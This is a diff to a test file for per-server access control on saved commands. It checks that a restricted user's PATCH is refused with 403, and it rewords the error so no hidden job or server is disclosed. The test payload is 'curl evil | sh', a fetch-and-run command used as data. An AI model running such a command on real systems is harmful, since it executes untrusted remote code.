@@ -177,7 +177,8 @@ describe('saved commands and per-server access', () => {
     it('403s a PATCH to a command that a cron job on an ungranted server runs', async () => {
       const res = await as(restricted).patch(`/api/commands/${usedOnB}`, { command: 'curl evil | sh' });
       expect(res.statusCode).toBe(403);
-      expect(res.json().error).toMatch(/cron job on a server you do not have access to/);
+      // Names no job or server the member may not see
+      expect(res.json().error).toMatch(/needs operate access to every server it is scheduled to run on/);
       expect(commandText(usedOnB)).toBe('echo used-on-b');
     });
 
